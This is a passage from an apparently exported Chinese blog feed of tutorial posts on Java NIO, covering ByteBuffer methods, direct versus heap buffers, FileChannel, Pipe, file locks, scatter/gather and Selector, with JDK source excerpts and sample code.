<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Buffer(int mark, int pos, int lim, int cap) &#123;</span><br><span class="line">        if (cap &lt; 0)</span><br><span class="line">            throw new IllegalArgumentException(&quot;Negative capacity: &quot; + cap);</span><br><span class="line">        this.capacity = cap;</span><br><span class="line">        limit(lim);</span><br><span class="line">        position(pos);</span><br><span class="line">        if (mark &gt;= 0) &#123;</span><br><span class="line">            if (mark &gt; pos)</span><br><span class="line">                throw new IllegalArgumentException(&quot;mark &gt; position: (&quot;+ mark + &quot; &gt; &quot; + pos +&quot;)&quot;);</span><br><span class="line">            this.mark = mark;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>当初始化Bytebuffer后实际的buffer对象的相关属性情况如下。</p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/image-9547fa6a4cc94749b8f60b2e7126ee82.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png" />
<figcaption><strong>旧站配图 1 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<h3 id="Buffer的核心方法"><a href="#Buffer的核心方法" class="headerlink" title="Buffer的核心方法"></a>Buffer的核心方法</h3><ul>
<li><p>get()</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public byte get() &#123;</span><br><span class="line">    return hb[ix(nextGetIndex())];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">final int nextGetIndex() &#123;</span><br><span class="line">    if (position &gt;= limit)</span><br><span class="line">        throw new BufferUnderflowException();</span><br><span class="line">    return position++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>put()</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public ByteBuffer put(byte x) &#123;</span><br><span class="line">    hb[ix(nextPutIndex())] = x;</span><br><span class="line">    return this;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">final int nextPutIndex() &#123;</span><br><span class="line">    if (position &gt;= limit)</span><br><span class="line">        throw new BufferOverflowException();</span><br><span class="line">    return position++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>\</p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/image-89fc5cc79c294db8989fa7d3aff05af9.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png" />
<figcaption><strong>旧站配图 2 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<p><br>每次put的时候position 都指向后一位</p>
</li>
<li><p>flip()<br>上图我们将a,b,c,d 加入到buffer后。当我们调用get()方法的时候是获取不到数据的,因为position是5调用get方法获取不到数据。<br>所以我们想获取数据,需要将position重新设置为0<br>查看get()源码,我们发现position &gt;&#x3D; limit才会抛出异常。所以我们还需要设置limit到5,需要两部操作。而flip()方法是将上面两个操作和成一个方法。执行的结果如下\</p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/image-6ffc3b8c1c6343a3905826f1f9b5a791.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png" />
<figcaption><strong>旧站配图 3 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>
</li>
<li><p>Rewind()<br>我们指向将position恢复到0,不影响limit,可以调用这个方法。</p>
</li>
<li><p>Clear()<br>调用clear方法,会将position设置到0,limit设置到capatity<br>在数组中真是的数据是没有被删除的。后续的put操作会覆盖原来的数据。</p>
</li>
<li><p>Mark()<br>标记,表示记录到当前position 的位置可以通过reset()恢复到mark()标记位置</p>
</li>
<li><p>hasremaining()<br>判断缓冲区中是否还有剩余数据</p>
</li>
<li><p>Remaining()<br>获取缓冲区还可以操作的数据</p>
</li>
</ul>
]]></content>
      <categories>
        <category>NIO 系列</category>
      </categories>
      <tags>
        <tag>java基础</tag>
        <tag>NIO</tag>
      </tags>
  </entry>
  <entry>
    <title>java NIO 相关(三) NIO 直接缓冲区和非直接缓冲区</title>
    <url>//2020/05/01/java%20NIO%E7%9B%B8%E5%85%B3(%E4%B8%89)%20NIO%20%E7%9B%B4%E6%8E%A5%E7%BC%93%E5%86%B2%E5%8C%BA%E5%92%8C%E9%9D%9E%E7%9B%B4%E6%8E%A5%E7%BC%93%E5%86%B2%E5%8C%BA/</url>
    <content><![CDATA[<h3 id="非直接缓冲区"><a href="#非直接缓冲区" class="headerlink" title="非直接缓冲区"></a>非直接缓冲区</h3><p>通过allocate() 方法分配缓冲区,将缓冲区建立在jvm的内存<br>直接与非直接缓冲区字节缓冲区要么是直接的，要么是非直接的·如果为直接字节缓冲区·则Java虐拟机会尽最大努力直接在此缓冲区上执行本机|&#x2F;0操作·也就是说，在每次调用基础操作系统的一个本机1&#x2F;0操作之前（或之后），虐拟机都会尽量避免将缓冲区的内容复制到中间缓冲区巾（或从中间缓冲区中复制内容）。</p>
<h3 id="直接缓冲区"><a href="#直接缓冲区" class="headerlink" title="直接缓冲区"></a>直接缓冲区</h3><p>通过allocateDirect() 方法分配直接缓冲区,将缓冲区建立在物理内存中，可以提高效率</p>
<p>直接字节缓冲区可以通过调用此类的allocateDirect()工厂方法来创建·此方法返回的缓冲区透行分配和取消分配所需成本通常于非直接缓冲区·<br>直接缓冲区的内容可以驻留在常規的垃圾回收堆之外·因此．它们对应用程序的内存需求量造成的影响可能并不明显。所以，建议将直接缓冲区主要分配给那些易受基础系统的本机|&#x2F;0操作影响的大型、持久的缓冲区·一情况下，最好舣在直接缓冲区能在程序性能方面帚来明显好处时分配它们</p>
<p>直接字节缓冲区还可以通过FileChanneI的map()方法将文件区域直接暌射到内存中来创建·该方法返回MappedByteBuffer·Java平台的实现有助于通过JNI从本机代码创建直接字节缓冲区·如果以上这些缓冲区中的某个缓冲区实蚪指的是不可访问的内存区域，则试图访问该区域不会更改该缓冲区的内容，并且将会在访问期间或鞘后的某时间导致出不定的异常·字节缓冲区是直接缓冲区还是非直接缓冲区可通过调用其isDirect()方法来确定．供此方法是为了能够在性能关键型代码中挾行显式缓冲区管理·</p>
<h3 id="图解直接缓冲区和非直接缓冲区"><a href="#图解直接缓冲区和非直接缓冲区" class="headerlink" title="图解直接缓冲区和非直接缓冲区"></a>图解直接缓冲区和非直接缓冲区</h3><figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/image-7e22439d787140f9befa9b7df1b6bb07.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png" />
<figcaption><strong>旧站配图 1 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/image-d444ebf068de43d09e9caf772a44ae32.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png" />
<figcaption><strong>旧站配图 2 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><ul>
<li><p>直接缓冲区</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static ByteBuffer allocate(int capacity) &#123;</span><br><span class="line"></span><br><span class="line">    if (capacity &lt; 0)</span><br><span class="line"></span><br><span class="line">         throw new IllegalArgumentException();</span><br><span class="line"></span><br><span class="line">    return new HeapByteBuffer(capacity, capacity);</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">HeapByteBuffer(int cap, int lim) &#123;            // package-private</span><br><span class="line"></span><br><span class="line">     super(-1, 0, lim, cap, new byte[cap], 0);</span><br><span class="line"></span><br><span class="line">     /*</span><br><span class="line"></span><br><span class="line">       hb = new byte[cap];</span><br><span class="line"></span><br><span class="line">       offset = 0;</span><br><span class="line"></span><br><span class="line">      */</span><br><span class="line"></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">可以看到直接在堆中创建空间也就是数组</span><br></pre></td></tr></table></figure>
</li>
<li><p>非直接缓冲区<br>public static ByteBuffer allocateDirect(int capacity) {</p>
<pre><code>  return new DirectByteBuffer(capacity);
</code></pre>
</li>
</ul>
<p>}</p>
<p>DirectByteBuffer(int cap) { &#x2F;&#x2F; package-private</p>
<pre><code>    super(-1, 0, cap, cap);

    boolean pa = VM.isDirectMemoryPageAligned();

    int ps = Bits.pageSize();

    long size = Math.max(1L, (long)cap + (pa ? ps : 0));

    Bits.reserveMemory(size, cap);


    long base = 0;

    try {

        base = unsafe.allocateMemory(size);

    } catch (OutOfMemoryError x) {

        Bits.unreserveMemory(size, cap);

        throw x;

    }

    unsafe.setMemory(base, size, (byte) 0);

    if (pa &amp;&amp; (base % ps != 0)) {

        // Round up to page boundary

        address = base + ps - (base &amp; (ps - 1));

    } else {

        address = base;

    }

    cleaner = Cleaner.create(this, new Deallocator(base, size, cap));

    att = null;


}
</code></pre>
<p>可以看到是根据</p>
<p>VM.isDirectMemoryPageAligned() 方法直接调用了内存分,让操作系统开辟缓存空间</p>
<h3 id="DirectByteBuffer-堆外内存"><a href="#DirectByteBuffer-堆外内存" class="headerlink" title="DirectByteBuffer(堆外内存)"></a>DirectByteBuffer(堆外内存)</h3><p>DirectByteBuffer 继承自 MappedByteBuffer，它们都是使用的堆外内存，不受 JVM 堆大小的 限制，只是前者仅仅是分配内存，后者是将文件映射到内存中。<br>可以通过 ByteBuf.allocateDirect 方法获取</p>
<h4 id="堆外内存的特点-大对象-加快内存拷贝-减轻-GC-压力"><a href="#堆外内存的特点-大对象-加快内存拷贝-减轻-GC-压力" class="headerlink" title="堆外内存的特点(大对象;加快内存拷贝;减轻 GC 压力)"></a>堆外内存的特点(大对象;加快内存拷贝;减轻 GC 压力)</h4><ul>
<li>对于大内存有良好的伸缩性(支持分配大块内存)</li>
<li>对垃圾回收停顿的改善可以明显感觉到(堆外内存，减少 GC 对堆内存回收的压力)</li>
<li>在进程间可以共享，减少虚拟机间的复制，加快复制速度(减少堆内内存拷贝到堆<br>外内存的过程)</li>
<li>还可以使用 池+堆外内存 的组合方式，来对生命周期较短，但涉及到 I&#x2F;O 操作的对象进行堆外内存的再使用。( Netty 中就使用了该方式 )</li>
</ul>
<h4 id="堆外内存的一些问题"><a href="#堆外内存的一些问题" class="headerlink" title="堆外内存的一些问题"></a>堆外内存的一些问题</h4><ol>
<li>堆外内存回收问题(不手工回收会导致内存溢出，手工回收就失去了 Java 的优势);</li>
<li>数据结构变得有些别扭。要么就是需要一个简单的数据结构以便于直接映射到堆外内存， 要么就使用复杂的数据结构并序列化及反序列化到内存中。很明显使用序列化的话会比较头 疼且存在性能瓶颈。使用序列化比使用堆对象的性能还差。</li>
</ol>
<h4 id="堆外内存的释放"><a href="#堆外内存的释放" class="headerlink" title="堆外内存的释放"></a>堆外内存的释放</h4><p>java.nio.DirectByteBuffer 对象在创建过程中会先通过 Unsafe 接口直接通过 os::malloc 来分配 内存，然后将内存的起始地址和大小存到 java.nio.DirectByteBuffer 对象里，这样就可以直接 操作这些内存。这些内存只有在 DirectByteBuffer 回收掉之后才有机会被回收，因此如果这 些对象大部分都移到了 old，但是一直没有触发 CMS GC 或者 Full GC，那么悲剧将会发生， 因为你的物理内存被他们耗尽了，因此为了避免这种悲剧的发生，通过 -XX:MaxDirectMemorySize 来指定最大的堆外内存大小，当使用达到了阈值的时候将调用 System.gc 来做一次 full gc，以此来回收掉没有被使用的堆外内存。<br>GC 方式:<br>存在于堆内的 DirectByteBuffer 对象很小，只存着基地址和大小等几个属性，和一个 Cleaner， 但它代表着后面所分配的一大段内存，是所谓的冰山对象。通过前面说的 Cleaner，堆内的 DirectByteBuffer 对象被 GC 时，它背后的堆外内存也会被回收。<br>当新生代满了，就会发生 minor gc;如果此时对象还没失效，就不会被回收;撑过几次 minorgc 后，对象被迁移到老生代;当老生代也满了，就会发生 full gc。 这里可以看到一种尴尬的情况，因为 DirectByteBuffer 本身的个头很小，只要熬过了 minor gc， 即使已经失效了也能在老生代里舒服的呆着，不容易把老生代撑爆触发 full gc，如果没有别 的大块头进入老生代触发 full gc，就一直在那耗着，占着一大片堆外内存不释放。<br>这时，就只能靠前面提到的申请额度超限时触发的 System.gc()来救场了。但这道最后的保 险其实也不很好，首先它会中断整个进程，然后它让当前线程睡了整整一百毫秒，而且如果 gc 没在一百毫秒内完成，它仍然会无情的抛出 OOM 异常。<br>那为什么 System.gc()会释放 DirectByteBuffer 呢?<br>每个 DirectByteBuffer 关联着其对应的 Cleaner，Cleaner 是 PhantomReference 的子类，虚 引用主要被用来跟踪对象被垃圾回收的状态，通过查看 ReferenceQueue 中是否包含对象所 对应的虚引用来判断它是否即将被垃圾回收。<br>当GC时发现DirectByteBuffer除了PhantomReference外已不可达，就会把它放进 Reference 类 pending list 静态变量里。然后另有一条 ReferenceHandler 线程，名字叫 “Reference Handler”的，关注着这个 pending list，如果看到有对象类型是 Cleaner，就会执行它的 clean()， 其他类型就放入应用构造 Reference 时传入的 ReferenceQueue 中，这样应用的代码可以从 Queue 里拖出这些理论上已死的对象，做爱做的事情——这是一种比 finalizer 更轻量更好的 机制。<br>手工方式:<br>如果想立即释放掉一个 MappedByteBuffer&#x2F;DirectByteBuffer，因为 JDK 没有提供公开 API， 只能使用反射的方法去 unmap;<br>或者使用 Cleaner 的 clean 方法。</p>
]]></content>
      <categories>
        <category>NIO 系列</category>
      </categories>
      <tags>
        <tag>java基础</tag>
        <tag>NIO</tag>
      </tags>
  </entry>
  <entry>
    <title>java NIO 相关(四) 通道 channel</title>
    <url>//2020/05/15/java%20NIO%E7%9B%B8%E5%85%B3(%E5%9B%9B)%20%E9%80%9A%E9%81%93%20channel/</url>
    <content><![CDATA[<h3 id="channel-介绍"><a href="#channel-介绍" class="headerlink" title="channel 介绍"></a>channel 介绍</h3><p>通道(channel) :由java.nio.channels包定义的,channel 表示IO源与目标打开的连接 。<br>Channel 类似于传统的流,只不过channel 本身不能直接访问数据,channel 只能与buffer进行交互</p>
<h4 id="一、通道-channel"><a href="#一、通道-channel" class="headerlink" title="一、通道(channel)"></a>一、通道(channel)</h4><p>用于源节点与目标节点的连接，在java nio中负责缓冲区数据的传输。channel本身不存储数据，因此需要配合缓冲区进行传输。</p>
<ul>
<li>流与通道的区别<br>1、流是单向的，通道是双向的，可读可写。<br>2、流读写是阻塞的，通道可以异步读写。<br>3、流中的数据可以选择性的先读到缓存中，通道的数据总是要先读到一个缓存中，或从缓 存中写入</li>
</ul>
<h4 id="二、通道的主要实现类"><a href="#二、通道的主要实现类" class="headerlink" title="二、通道的主要实现类"></a>二、通道的主要实现类</h4><p>Java.nio.channels.Channel接口</p>
<p>|–FileChannel</p>
<p>|–SocketChannel</p>
<p>|–ServerSocetChannel</p>
<p>|–DataramChannel</p>
<h4 id="三、获取通道"><a href="#三、获取通道" class="headerlink" title="三、获取通道"></a>三、获取通道</h4><p>JAVA针对支持通道的类提供了getChannel()方法</p>
<p>本地IO</p>
<p>FileInputStream&#x2F;FileOutputStream</p>
<p>RamdomAccessFile</p>
<p>网络IO</p>
<p>Socket</p>
<p>ServerSocket</p>
<p>DatagramSocket</p>
<p>在JDK1.7中的NIO.2 针对各个通道提供了静态方法open()</p>
<p>在JDK1.7中的Files工具类的newByteChannel()</p>
<h4 id="四、非直接缓冲区使用channel的dome"><a href="#四、非直接缓冲区使用channel的dome" class="headerlink" title="四、非直接缓冲区使用channel的dome"></a>四、非直接缓冲区使用channel的dome</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line">        FileInputStream fis = null;</span><br><span class="line"></span><br><span class="line">        FileOutputStream fos = null;</span><br><span class="line"></span><br><span class="line">        //nio 文件复制</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line"></span><br><span class="line">            fis = new FileInputStream(&quot;C:\\Users\\12113\\Desktop\\1.html&quot;);</span><br><span class="line"></span><br><span class="line">            fos = new FileOutputStream(&quot;C:\\Users\\12113\\Desktop\\nio.html&quot;);</span><br><span class="line"></span><br><span class="line">            FileChannel fosChannel = fos.getChannel();</span><br><span class="line"></span><br><span class="line">            FileChannel fisChannel = fis.getChannel();</span><br><span class="line"></span><br><span class="line">            ByteBuffer buffer =ByteBuffer.allocate(1024);</span><br><span class="line"></span><br><span class="line">            while (fisChannel.read(buffer)!=-1)&#123;</span><br><span class="line"></span><br><span class="line">                buffer.flip(); //写模式</span><br><span class="line"></span><br><span class="line">                fosChannel.write(buffer);</span><br><span class="line"></span><br><span class="line">                buffer.clear();</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; catch (FileNotFoundException e) &#123;</span><br><span class="line"></span><br><span class="line">        &#125; catch (IOException e) &#123;</span><br><span class="line"></span><br><span class="line">            e.printStackTrace();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<h4 id="五、直接缓冲区使用channel"><a href="#五、直接缓冲区使用channel" class="headerlink" title="五、直接缓冲区使用channel"></a>五、直接缓冲区使用channel</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public static void main(String[] args) throws IOException &#123;</span><br><span class="line"></span><br><span class="line">        FileChannel fileInChannel = FileChannel.open(Paths.get(&quot;C:\\Users\\12113\\Desktop\\temp.txt&quot;), StandardOpenOption.READ);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        FileChannel fileOutChannel = FileChannel.open(Paths.get(&quot;C:\\Users\\12113\\Desktop\\nio3.txt&quot;), StandardOpenOption.WRITE, StandardOpenOption.READ, StandardOpenOption.CREATE_NEW);</span><br><span class="line">     MappedByteBuffer inByteBuffer =  fileInChannel.map(MapMode.READ_ONLY, 0, fileInChannel.size());</span><br><span class="line"></span><br><span class="line">        MappedByteBuffer outByteBuffer =   fileOutChannel.map(MapMode.READ_WRITE, 0, fileInChannel.size());</span><br><span class="line"></span><br><span class="line">        byte[] dest =new byte[inByteBuffer.limit()];</span><br><span class="line"></span><br><span class="line">        inByteBuffer.get(dest);</span><br><span class="line"></span><br><span class="line">        outByteBuffer.put(dest);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">//通道之间传输</span><br><span class="line"></span><br><span class="line">      fileInChannel.transferTo(0,fileInChannel.size(),fileOutChannel);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="六、channel-的数据传输"><a href="#六、channel-的数据传输" class="headerlink" title="六、channel 的数据传输"></a>六、channel 的数据传输</h3><p>transferTo()</p>
<p>transferFrom()</p>
<h3 id="七、图解channel"><a href="#七、图解channel" class="headerlink" title="七、图解channel"></a>七、图解channel</h3><p>Channel是一个独立的处理器，专门用于IO操作，附属于CPU。<br>在提出IO请求的时候，CPU不需要进行干预，也就提高了效率。\</p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/image-b61c14c0c361492cabc9de32040154f4.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png" />
<figcaption><strong>旧站配图 1 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>
]]></content>
      <categories>
        <category>NIO 系列</category>
      </categories>
      <tags>
        <tag>java基础</tag>
        <tag>NIO</tag>
      </tags>
  </entry>
  <entry>
    <title>java NIO 相关(六) pipe 和 FileChannel文件锁</title>
    <url>//2020/05/21/java%20NIO%E7%9B%B8%E5%85%B3(%E5%85%AD)%20pipe%20%E5%92%8C%20FileChannel%E6%96%87%E4%BB%B6%E9%94%81/</url>
    <content><![CDATA[<h3 id="一、pipe"><a href="#一、pipe" class="headerlink" title="一、pipe"></a>一、pipe</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>pipe 是nio管道2个线程之前的单项数据连接。<br>pipe 有2个通道一个是source通道一个是sink通道<br>数据会写入到source通道从sink通道获取数据。如图：\</p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/image-bd9f6b5abebf408b8ce8935ceb5fe357.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png" />
<figcaption><strong>旧站配图 1 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<h4 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class PipeTest &#123;</span><br><span class="line">public static void main(String[] args) &#123;</span><br><span class="line"></span><br><span class="line">    Pipe pipe = null;</span><br><span class="line">    ExecutorService exec =  Executors.newFixedThreadPool(2);</span><br><span class="line">try &#123;</span><br><span class="line">    pipe = Pipe.open();</span><br><span class="line">    final Pipe pipeTemp = pipe;</span><br><span class="line">    exec.submit(new Callable&lt;Object&gt;() &#123; @Override</span><br><span class="line">        public Object call() throws Exception &#123;</span><br><span class="line">        Pipe.SinkChannel sinkChannel = pipeTemp.sink();//向通道中写</span><br><span class="line">    while (true) &#123;</span><br><span class="line">        TimeUnit.SECONDS.sleep(1);</span><br><span class="line">        String newData = &quot;Pipe Test At Time &quot; +</span><br><span class="line">        System.currentTimeMillis();</span><br><span class="line">        ByteBuffer buf = ByteBuffer.allocate(1024);</span><br><span class="line">        buf.clear(); buf.put(newData.getBytes());       buf.flip();</span><br><span class="line">        while (buf.hasRemaining()) &#123;</span><br><span class="line">        System.out.println(buf);</span><br><span class="line">        sinkChannel.write(buf);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;);</span><br><span class="line">    exec.submit(new Callable&lt;Object&gt;() &#123;</span><br><span class="line">    @Override</span><br><span class="line">    public Object call() throws Exception &#123;Pipe.SourceChannel sourceChannel = pipeTemp.source();//向</span><br><span class="line">    while (true) &#123;</span><br><span class="line">    TimeUnit.SECONDS.sleep(1);</span><br><span class="line">    ByteBuffer buf = ByteBuffer.allocate(1024);</span><br><span class="line">    buf.clear();</span><br><span class="line">    int bytesRead = sourceChannel.read(buf);</span><br><span class="line">    System.out.println(&quot;bytesRead=&quot; + bytesRead);</span><br><span class="line">    while (bytesRead &gt; 0) &#123;</span><br><span class="line">    buf.flip();</span><br><span class="line">    byte b[] = new byte[bytesRead]; int i = 0;</span><br><span class="line">    while (buf.hasRemaining()) &#123;</span><br><span class="line">    b[i] = buf.get(); System.out.printf(&quot;%X&quot;, b[i]);</span><br><span class="line">    i++;</span><br><span class="line">    &#125;</span><br><span class="line">    String s = new String(b);</span><br><span class="line">    System.out.println(&quot;=================||&quot; + s);</span><br><span class="line">    bytesRead = sourceChannel.read(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="二、FileChannel文件锁"><a href="#二、FileChannel文件锁" class="headerlink" title="二、FileChannel文件锁"></a>二、FileChannel文件锁</h3><p>在通道中我们可以对文件或者部分文件进行上锁。上锁和我们了解的线程锁差不多，都是为 了保证数据的一致性。在文件通道 FileChannel 中可以对文件进行上锁，通过 FileLock 可以 对文件进行锁的释放。 文件加锁是建立在文件通道(FileChannel)之上的，套接字通道(SockeChannel)不考虑文 件加锁，因为它是不共享的。<br>它对文件加锁有两种方式:</p>
<ol>
<li>lock</li>
<li>tryLock</li>
</ol>
<p>两种加锁方式默认都是对整个文件加锁，如果自己配置的话就可以控制加锁的文件范围: position 是加锁的开始位置，size 是加锁长度，shared 是用于控制该锁是共享的还是独占的。</p>
<ul>
<li>lock 是阻塞式的，当有进程对锁进行读取时会等待锁的释放，在此期间它会一直等待;</li>
<li>tryLock 是非阻塞式的，它尝试获得锁，如果这个锁不能获得，那么它会立即返回。</li>
</ul>
<p>release 可以释放锁。<br>在一个进程中在锁没有释放之前是无法再次获得锁的<br>在 java 的 NIO 中，通道包下面有一个 FileLock 类，它主要是对文件锁工具的一个描述。在 上一小节中对文件的锁获取其实是 FileChannel 获取的(lock 与 trylock 是 FileChannel 的方 法)，它们返回一个 FileLock 对象。</p>
<p>这个类的核心方法有如下这些:<br>boolean isShared() :判断锁是否为共享类型<br>abstract boolean isValid() :判断锁是否有效<br>boolean overlaps():判断此锁定是否与给定的锁定区域重叠 long position():返回文件内锁定区域中第一个字节的位置。<br>abstract void release() :释放锁<br>long size() :返回锁定区域的大小，以字节为单位</p>
<p>在文件锁中有 3 种方式可以释放文件锁:</p>
<ol>
<li>锁类释放锁，调用 FileLock 的 release 方法</li>
<li>通道类关闭通道，调用 FileChannel 的 close 方法</li>
<li>jvm 虚拟机会在特定情况释放锁。</li>
</ol>
<h3 id="锁类型-独占式和共享式"><a href="#锁类型-独占式和共享式" class="headerlink" title="锁类型(独占式和共享式)"></a>锁类型(独占式和共享式)</h3><p>我们先区分一下在文件锁中两种锁的区别:</p>
<ol>
<li>独占式的锁就想我们上面测试的那样，只要有一个进程获取了独占锁，那么别的进程只能等待。</li>
<li>共享锁在一个进程获取的情况下，别的 进程还是可以读取被锁定的文件，但是别的进程不能写只能读。</li>
</ol>
]]></content>
      <categories>
        <category>NIO 系列</category>
      </categories>
      <tags>
        <tag>java基础</tag>
        <tag>NIO</tag>
      </tags>
  </entry>
  <entry>
    <title>java NIO 相关(五) 分散(Scatter) 和聚集(Gather)</title>
    <url>//2020/05/17/java%20NIO%E7%9B%B8%E5%85%B3(%E4%BA%94)%20%E5%88%86%E6%95%A3(Scatter)%20%E5%92%8C%E8%81%9A%E9%9B%86(Gather)/</url>
    <content><![CDATA[<h3 id="分散-Scatter-和聚集-Gather"><a href="#分散-Scatter-和聚集-Gather" class="headerlink" title="分散(Scatter) 和聚集(Gather)"></a>分散(Scatter) 和聚集(Gather)</h3><p>分散读取(scattering reads) 是从channel中读取的数据“分散”到多个buffer中</p>
<figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/image-d7dd945680e34da1b55f41c09e4c583f.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png" />
<figcaption><strong>旧站配图 1 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

<p>注意:按照缓冲区的顺序,写入position 和limit 之间的数据到channel</p>
<ul>
<li>分散读取<br>将通道中的数据分散到多个缓冲区中</li>
<li>聚集写入<br>将多个缓冲区中的数据聚集到通道中</li>
</ul>
]]></content>
      <categories>
        <category>NIO 系列</category>
      </categories>
      <tags>
        <tag>java基础</tag>
        <tag>NIO</tag>
      </tags>
  </entry>
  <entry>
    <title>java NIO 相关(七) nio selector channel 的多路复用器</title>
    <url>//2020/05/30/java%20NIO%E7%9B%B8%E5%85%B3(%E4%B8%83)%20nio%20selector(channel%20%E7%9A%84%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E5%99%A8)/</url>
    <content><![CDATA[<h3 id="一、概念"><a href="#一、概念" class="headerlink" title="一、概念"></a>一、概念</h3><p>选择器（selector）是selectableChannel对象的多路复用器,一个selector可以监控多个selectableChannel的io情况,selector可以实现一个线程单独管理多个channel,selector是非阻塞的核心</p>
<h3 id="二、selector可以监控的事件类型"><a href="#二、selector可以监控的事件类型" class="headerlink" title="二、selector可以监控的事件类型"></a>二、selector可以监控的事件类型</h3><ol>
<li>connect 客户端连接服务端事件</li>
<li>accept 服务端接受服务端事件</li>
<li>read 读事件</li>
<li>write 写事件</li>
</ol>
<p>每次请求都是从客户端连接服务端(connect),服务端开始准备(accept),准备完成后开始读数据,处理完成之后再写数据</p>
<h3 id="三、selector的常用方法"><a href="#三、selector的常用方法" class="headerlink" title="三、selector的常用方法"></a>三、selector的常用方法</h3><figure class="legacy-image-notice" data-original-src="https://dmr-blog.oss-cn-shanghai.aliyuncs.com/blog/image-22c6aa2f552a4064b9f051c9520d9917.png">
<img src="/images/legacy-missing.svg" class="lazyload" data-srcset="/images/legacy-missing.svg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image.png" />
<figcaption><strong>旧站配图 1 未恢复</strong> · 原 OSS 存储桶已经删除，原始地址已记录在迁移清单中。</figcaption>
</figure>

